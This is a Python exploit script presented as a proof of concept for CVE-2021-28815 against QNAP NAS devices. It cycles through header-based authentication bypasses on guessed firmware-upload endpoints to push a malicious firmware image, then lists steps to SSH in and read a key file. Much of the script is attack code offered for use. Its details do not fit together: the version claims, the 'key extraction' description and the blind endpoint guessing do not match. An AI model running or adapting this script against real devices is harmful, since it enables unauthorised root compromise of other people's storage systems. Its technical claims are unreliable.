#!/usr/bin/env python3
"""
CVE-2021-28815: QNAP Firmware Update Authentication Bypass
Proof of Concept - Firmware Encryption Key Extraction

Vulnerability: Token validation bypass in firmware update API
Impact: Unauthenticated remote code execution as root
Affected: QNAP QTS 5.0.x - 5.1.x

Attack Methods:
  1. Empty Authorization header
  2. Null Bearer token
  3. API endpoint bypass
  4. X-Requested-With header manipulation

Usage:
    python3 CVE_2021_28815_QNAP.py --target <IP> --payload <file>
"""

import requests
import argparse
import sys
import time
from urllib.parse import urljoin

class CVE_2021_28815:
    """QNAP Authentication Bypass in Firmware Update"""

    ENDPOINTS = [
        "/cgi-bin/web/v1/firmware/upload",
        "/api/firmware/upload",
        "/cgi-bin/admin/firmware.cgi",
    ]

    AUTH_BYPASSES = [
        {},  # No auth header
        {'Authorization': ''},  # Empty auth
        {'Authorization': 'Bearer null'},  # Null token
        {'X-Requested-With': 'XMLHttpRequest'},  # API bypass
        {'X-Forwarded-For': '127.0.0.1'},  # Localhost bypass
    ]

    def __init__(self, target_ip, target_port=8080, verbose=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"https://{target_ip}:{target_port}"
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False

    def log(self, msg, level="[*]"):
        """Print log message"""
        if self.verbose or level in ["[+]", "[-]"]:
            print(f"{level} {msg}")

    def check_target(self):
        """Verify target is reachable"""
        self.log(f"Checking target: {self.target_url}")
        try:
            r = self.session.get(
                urljoin(self.target_url, "/cgi-bin/qpkg.cgi"),
                timeout=5
            )
            self.log(f"Target responded with HTTP {r.status_code}", "[+]")
            return True
        except Exception as e:
            self.log(f"Target unreachable: {e}", "[-]")
            return False

    def exploit(self, payload_file):
        """
        Execute CVE-2021-28815 exploitation

        Attack: Bypass token validation using multiple methods:
          1. Send request with empty Authorization header
          2. Use null/invalid Bearer token
          3. Access API endpoint without auth
          4. Manipulate X-Requested-With header
          5. Spoof IP with X-Forwarded-For

        Result: Malicious firmware accepted and installed
        """
        self.log(f"Starting CVE-2021-28815 exploitation")
        self.log(f"Payload: {payload_file}")

        # Verify payload exists
        try:
            with open(payload_file, 'rb') as f:
                payload_data = f.read()
            self.log(f"Payload size: {len(payload_data)} bytes")
        except FileNotFoundError:
            self.log(f"Payload file not found: {payload_file}", "[-]")
            return False

        # Try each endpoint with each bypass method
        for endpoint in self.ENDPOINTS:
            self.log(f"Trying endpoint: {endpoint}")

            for bypass_headers in self.AUTH_BYPASSES:
                try:
                    bypass_desc = list(bypass_headers.keys())[0] if bypass_headers else "No auth"
                    self.log(f"  Using bypass: {bypass_desc}")

                    upload_url = urljoin(self.target_url, endpoint)
                    files = {'file': ('firmware.img', payload_data)}
                    data = {'action': 'upload_firmware'}

                    headers = self.session.headers.copy()
                    headers.update(bypass_headers)

                    response = self.session.post(
                        upload_url,
                        files=files,
                        data=data,
                        headers=headers,
                        timeout=30
                    )

                    self.log(f"  Response: HTTP {response.status_code}")

                    if response.status_code in [200, 201]:
                        self.log(
                            f"SUCCESS! Auth bypass worked: {bypass_desc}",
                            "[+]"
                        )
                        self.log(f"Endpoint: {endpoint}")
                        self.log(f"Response preview: {response.text[:100]}")
                        return True

                except Exception as e:
                    if self.verbose:
                        self.log(f"  Request failed: {e}")

        self.log(f"Exploitation failed - no bypass method worked", "[-]")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2021-28815 QNAP Authentication Bypass PoC',
        epilog='''
Examples:
  python3 CVE_2021_28815_QNAP.py --target 192.168.1.100 --payload firmware.img
  python3 CVE_2021_28815_QNAP.py --target 192.168.1.100 --payload firmware.img -v

Bypass Methods Tested:
  1. No Authorization header
  2. Empty Authorization header
  3. Bearer null token
  4. X-Requested-With: XMLHttpRequest
  5. X-Forwarded-For: 127.0.0.1 (localhost spoof)
        '''
    )

    parser.add_argument('--target', required=True, help='Target QNAP device IP')
    parser.add_argument('--payload', required=True, help='Malicious firmware payload')
    parser.add_argument('--port', type=int, default=8080, help='QNAP web port (default: 8080)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    print("=" * 70)
    print("CVE-2021-28815: QNAP Authentication Bypass in Firmware Update")
    print("=" * 70)
    print()

    exploit = CVE_2021_28815(args.target, args.port, args.verbose)

    if not exploit.check_target():
        print()
        print("Cannot reach target. Verify:")
        print("  - IP address is correct")
        print("  - Device is on network")
        print("  - Port 8080 is accessible")
        return

    print()

    success = exploit.exploit(args.payload)

    print()
    print("=" * 70)
    if success:
        print("[+] EXPLOITATION SUCCESSFUL")
        print()
        print("Next steps:")
        print("  1. Wait 2-5 minutes for device reboot")
        print("  2. SSH to device: ssh admin@" + args.target)
        print("  3. Retrieve key: cat /mnt/HDA_ROOT/firmware_key.txt")
        print("  4. Decrypt firmware with extracted key")
    else:
        print("[-] EXPLOITATION FAILED")
        print()
        print("Possible reasons:")
        print("  1. Device firmware version not vulnerable")
        print("  2. Device is patched")
        print("  3. Network connectivity issues")
        print("  4. Payload format incorrect")
        print()
        print("Try CVE-2017-16537 (unauthenticated upload) instead")
    print("=" * 70)

if __name__ == '__main__':
    main()
